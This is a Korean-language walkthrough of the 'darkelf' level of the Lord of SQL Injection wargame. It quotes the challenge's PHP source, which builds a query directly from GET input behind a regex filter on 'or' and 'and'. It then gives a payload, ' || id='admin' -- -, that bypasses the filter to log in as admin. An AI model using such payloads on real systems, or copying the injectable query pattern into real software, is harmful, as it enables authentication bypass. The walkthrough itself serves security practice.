# Lord of SQL Injection No.6 - darkelp
## 문제 출제 의도
'and', 'or' 없이 SQL문을 조작 할 수 있는지 확인한다.
## 소스 코드 분석
+ 소스코드
darkelp의 소스코드는 다음과 같다.
    ~~~
    <?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect();  
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
    $query = "select id from prob_darkelf where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("darkelf"); 
    highlight_file(__FILE__); 
    ?>
    ~~~
+ 소스 코드 분석
    - GET방식으로 받은 pw 값에 'and'나 'or'가 들어있으면 "hehe"가 출력되고 문제 풀이에 실패한다.
    - 받아온 id 값에 0이 아닌 다른 값이 있다면 "Hello + id"가 출력된다.
    - 문제 풀이에 성공하는 조건은 데이터베이스에서 받아온 아이디 값이 'admin'일떄 이다.
## 문제 해결
+ 추가 문자열
    - admin 값을 id로 받아오기 위해서는 다음과 같은 문자열이 URL다음에 추가되어야 한다.
    ~~~
    ?pw=' or id='admin' -- -
    ~~~

+ || 이용
    - ||을 이용하면 or을 사용하지 않고 문자열을 조작할 수 있다.
    ~~~
    ?pw=' || id='admin' -- -
    ~~~
    따라서 위와 같은 문자열을 URL뒤에 추가하면 문제가 해결 된다.